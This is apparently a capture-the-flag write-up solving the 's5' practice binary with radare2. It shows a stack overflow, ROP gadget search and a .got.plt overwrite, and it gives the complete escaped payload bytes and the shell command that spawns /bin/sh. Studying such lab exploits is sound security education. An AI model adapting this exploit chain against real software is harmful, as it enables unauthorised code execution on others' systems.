# Solving wapiflapi's s5 with radare2

## Intro
This is a tiny yet interesting piece of code:


```c
int	 main(int argc, char **argv)
{
  char buffer[32];

  (void) argc, (void) argv;

  printf("Welcome Stranger\n");
  printf("What is your password?\n");

  if (read(0, buffer, 1024) <= 0)
    err(EXIT_FAILURE, "read");

  printf("If you're cool you'll get a shell.\n");

  if (strcmp("pretend_you_dont_know_this", buffer) == 0)
    system("whoami # not sh :)");

  return 0;
}
```
### Goal
To spawn a shell

### Challanges
1. built-in `system` call's argument is not a shell
2. only one read call in a single buffer
3. must be solved using only stdin
4. no assumptions on libc version or address layout are allowed

### Solution plan

1. with the first read on the buffer, smash the stack and gain control of `rip`
2. do a second read, writing the `/bin/sh` string at a known address
3. execute `system` using the above command as argument
4. use some ROP because it's fun

What follows is one of the possible solutions, reached by using the radare2 suite and GNU tools.

## Watching from above
Let's examine the provided binary and gain some overview info:

```
$ file s5
s5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, not stripped
```

As all other wapiflapi's s-series exrs, this is a 64-bit ELF executable with dynamic linking. No big news, let's spawn radare2:

```
$ r2 s5
 -- Finnished a beer
[0x00400560]> aa
[0x00400560]> s main
[0x0040064d]> V
```
Disassembling in visual mode, it is evident that all local variables are allocated in 48 bytes of stack:

```asm
│          ;-- main:                 
│          ;-- sym.main:             
│          0x0040064d   push rbp     
│          0x0040064e   mov rbp, rsp 
│          0x00400651   sub rsp, 0x30

```
The vulnerable read, as it was already evident from source code, will thankfully read 1024 bytes in the buffer:

```asm
│          0x00400670   lea rax, [rbp - 0x20]
│          0x00400674   mov edx, 0x400
│          0x00400679   mov rsi, rax
│          0x0040067c   mov edi, 0
│          0x00400681   mov eax, 0
│          0x00400686   call sym.imp.read
```
And finally, the call to `system`, "protected" by a `strcmp`:

```asm
│          0x004006b9   call sym.imp.strcmp
│          0x004006be   test eax, eax
│     ┌──< 0x004006c0   jne 0x4006cc
│     │    0x004006c2   mov edi, str.whoami___not_sh_:_
│     │    0x004006c7   call sym.imp.system

```

## Step 1 - smashing the stack
The buffer overflown by the vulnerable `read` is placed at `rbp-0x20`. So, the first 32 bytes of the buffer are just fillers, after that it is possible to stuff the new stack layout in order to thwarth the program counter to execute chosen instructions, here is an overview of the desired buffer structure:

Chunk Contents   | Chunk length   | Meaning 
-----------------| ---------------|----------------
0x42..0x42       | 32 bytes       | Initial padding (fills the buffer)
0x42..0x42       | 8 bytes        | Overwrites saved frame pointer
0x??..0x??       | 8 bytes        | This overwrites the return address of `main`. From here on, all 8-bytes chunks can be addresses of code or data of choice

But, what to put in the stack? This depends on the task we choose to perform, let's dig further.

## Step 2 - read "/bin/sh" into a fixed memory location 

The first thing to do is making the read call to write into a buffer at a fixed memory location, different from the original intended buffer. Examining the above disassembled `read` snippet, it is straightforward to understand that by controlling `rbp` it is possible to read at an arbirary target location, by setting `rbp = TARGET+0x20`. 

Let's do it with ROP. First, find a suitable gadget:

```
[0x0040064d]> e rop.len = 2
[0x0040064d]> e search.count = 2
[0x0040064d]> /R rbp
  0x004005a5             5d  pop rbp
  0x004005a6             c3  ret

  0x004005e2             5d  pop rbp
  0x004005e3             c3  ret
```

Good, the first is ok. Now we know three chunks to add to the first buffer:

Chunk Contents   | Chunk length   | Meaning 
-----------------| ---------------|----------------
0x004005a5       | 8 bytes        | Address of "pop rbp; ret" gadget 
0xTARGET         | 8 bytes        | Address of desired target buffer (still to be chosen)
0x00400670       | 8 bytes        | Address of the `read` snippet 

In order to find a place (`0xTARGET`) to store the shell command, let's enumerate the writable sections:

```
[0x0040068d]> iS | grep perm=..w
idx=17 vaddr=0x00600e10 paddr=0x00000e10 sz=8 vsz=8 perm=-rw- name=.init_array
idx=18 vaddr=0x00600e18 paddr=0x00000e18 sz=8 vsz=8 perm=-rw- name=.fini_array
idx=19 vaddr=0x00600e20 paddr=0x00000e20 sz=8 vsz=8 perm=-rw- name=.jcr
idx=20 vaddr=0x00600e28 paddr=0x00000e28 sz=464 vsz=464 perm=-rw- name=.dynamic
idx=21 vaddr=0x00600ff8 paddr=0x00000ff8 sz=8 vsz=8 perm=-rw- name=.got
idx=22 vaddr=0x00601000 paddr=0x00001000 sz=80 vsz=80 perm=-rw- name=.got.plt
idx=23 vaddr=0x00601050 paddr=0x00001050 sz=16 vsz=16 perm=-rw- name=.data
idx=24 vaddr=0x00601060 paddr=0x00001060 sz=8 vsz=8 perm=-rw- name=.bss
idx=30 vaddr=0x00600e10 paddr=0x00000e10 sz=2097152 vsz=2097152 perm=-rw- name=phdr1
idx=31 vaddr=0x00400000 paddr=0x00000000 sz=64 vsz=64 perm=-rw- name=ehdr
```
Since "/bin/sh" is 8-bytes long (including null terminator), there is plenty of space to fit it in. 

Before choosing the correct location, though, let's reason about the downside of messing with `rbp`. Let's look at the epilogue of the `main` function:

```asm
│          0x004006d1   leave
╘          0x004006d2   ret
```
The `leave` instruction will set `rsp` to the value of `rbp` and we would loose the control of the stack, since the return address will be popped from a wrong stack.

This means that we need to regain control of the stack **before** the main function reaches its epilogue, therefore we cannot use ROP this time.

One way is to overwrite a **.got.plt** entry (one that we don't need for our dark purposes) with the address of some code that let us regain the stack control. From here the silly idea: why not use the PLT as 0xTARGET? in this way it will hold the "/bin/sh" command **and** within the same `read` call we can carefully overwrite an entry in order to avoid the `main` epilogue.

Let's examine the PLT closely:

```
[0x0040069e]> iS~.got.plt
idx=22 vaddr=0x00601000 paddr=0x00001000 sz=80 vsz=80 perm=-rw- name=.got.plt

[0x0040069e]> pxw 80 @ 0x00601000 
0x00601000  0x00600e28 0x00000000 0x00000000 0x00000000  (.`.............
0x00601010  0x00000000 0x00000000 0x004004f6 0x00000000  ..........@.....
0x00601020  0x00400506 0x00000000 0x00400516 0x00000000  ..@.......@.....
0x00601030  0x00400526 0x00000000 0x00400536 0x00000000  &.@.....6.@.....
0x00601040  0x00400546 0x00000000 0x00400556 0x00000000  F.@.....V.@.....

[0x0040069e]> is~imp.
vaddr=0x004004f0 paddr=0x000004f0 ord=001 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.puts
vaddr=0x00400500 paddr=0x00000500 ord=002 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.system
vaddr=0x00400510 paddr=0x00000510 ord=003 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.read
vaddr=0x00400520 paddr=0x00000520 ord=004 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.__libc_start_main
vaddr=0x00400530 paddr=0x00000530 ord=005 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.strcmp
vaddr=0x00400540 paddr=0x00000540 ord=006 fwd=NONE sz=16 bind=UNKNOWN type=NOTYPE name=imp.__gmon_start__
vaddr=0x00400550 paddr=0x00000550 ord=007 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.err
```

By choosing the address `0x00601030` as value for 0xTARGET, we'll overwrite the entry for `__libc_start_main` with the bytes of the command "/bin/sh" plus the null terminator, and replace the adjacent entry (in this case `strcmp`) with the address of some useful ROP gadget that will give us back the control of the stack. Let's search for gadgets again, this time we need a pop and a ret (edited for brevity):

```
[0x0040069e]> /R pop

[...]

  0x00400743             5f  pop rdi
  0x00400744             c3  ret
```
Here the gadget at `0x00400743` can be perfect: it will pop the return address from the stack (because we are **calling** this gadget, instead of `strcmp`) and return to the ROP chain prepared on the stack after the first `read`. Actually, this gadget can be used again to get the address of "/bin/sh" into `rdi` before calling `system`.

## Putting things together
At this point, all the needed information is gathered and it's possible to structure the data to send in both `read` calls.

###Data for the first read:

Chunk Contents   | Chunk length   | Meaning 
-----------------| ---------------|----------------
0x42..0x42       | 32 bytes       | Initial padding (fills the buffer)
0x42..0x42       | 8 bytes        | Overwrites saved frame pointer
0x004005a5       | 8 bytes        | Address of "pop rbp; ret" gadget 
0x00601050       | 8 bytes        | Address of __libc\_start\_main entry in .got.plt, target of the second read (+ 0x20)
0x00400670       | 8 bytes        | Address of the `read` snippet 
0x00400743		| 8 bytes			| Address of "pop rdi; ret" gadget, to make `rdi` point to the "/bin/sh" command
0x00601030       | 8 bytes        | Address of "/bin/sh"
0x004006d2       | 8 bytes        | Address of a "ret" gadget, just to keep the stack aligned for 64 bits function calls (`ret` is the `nop` of ROP world)
0x004006c7       | 8 bytes        | Address to the `call sym.imp.system` instruction in the `main`

Porting this to 64-bit little endian addresses, and escaping everything for `bash`-friendliness, here is the first buffer:

~~~
\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x07\x40\x00\x00\x00\x00\x00\xa5\x05\x40\x00\x00\x00\x00\x00\x50\x10\x60\x00\x00\x00\x00\x00\x70\x06\x40\x00\x00\x00\x00\x00\x43\x07\x40\x00\x00\x00\x00\x00\x30\x10\x60\x00\x00\x00\x00\x00\xd2\x06\x40\x00\x00\x00\x00\x00\xc7\x06\x40\x00\x00\x00\x00\x00
~~~

### Data for the second read:

Chunk Contents   | Chunk length   | Meaning 
-----------------| ---------------|----------------
/bin/sh\x00      | 8 bytes        | Our evil command
0x00400743       | 8 bytes        | Address of the "pop rdi; ret" here used to return back to our ROP chain by overwriting this pointer to the `strcmp` entry in .got.plt

Here again, bash-friendly:

~~~
\x2f\x62\x69\x6e\x2f\x73\x68\x00\x43\x07\x40\x00\x00\x00\x00\x00
~~~

## Running and cinema

Here is the command line used to send escaped bytes to stdin:

```bash
 while read -r line; do echo -e $line; done | ./s5
```
[![asciicast](https://asciinema.org/a/8dzqjsi9wfbx3v8ex4pyxqsdo.png)](https://asciinema.org/a/8dzqjsi9wfbx3v8ex4pyxqsdo)


